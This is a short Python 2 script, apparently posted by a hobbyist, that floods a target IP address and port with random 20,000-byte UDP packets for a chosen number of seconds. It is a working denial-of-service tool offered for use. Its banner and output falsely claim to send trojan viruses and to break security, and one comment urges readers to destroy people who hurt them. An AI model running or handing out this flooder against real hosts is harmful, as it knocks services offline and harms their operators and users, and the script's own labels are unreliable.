import time
import socket
import random
import sys
def usage():
    print "|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||"
    print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    print "____________________________ Script by User91 _________________________"
    print "================= Subscribe my youtube channel ArieSR91 ==============="
    print " "
    print "_______________ This script is for sending Trojan Viruses _____________"
    print " "
    print "____________________________  Are you ready ___________________________"
    print " "
    print "  To get started type: python2 trojans.py (target ip) (port) (amount)"
def flood(victim, vport, duration):

    # Don't abuse this script!
        # Jangan disalahngunakan scrip ini!
      # Remember, hackers are helper, not destroyer
          # Ingat, Hacker itu penolong, bukan perusak
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       # My only message is one, destroy the people who hurt you.
           # Pesanku cuma satu, Hancurkan orang yang menyakitimu.
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\33[0;32mSend Attack in \33[31;1m%s \33[0;32mTorjan Succeess send to \33[31;1m%s \33[0;32mManaged to break security \33[31;1m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
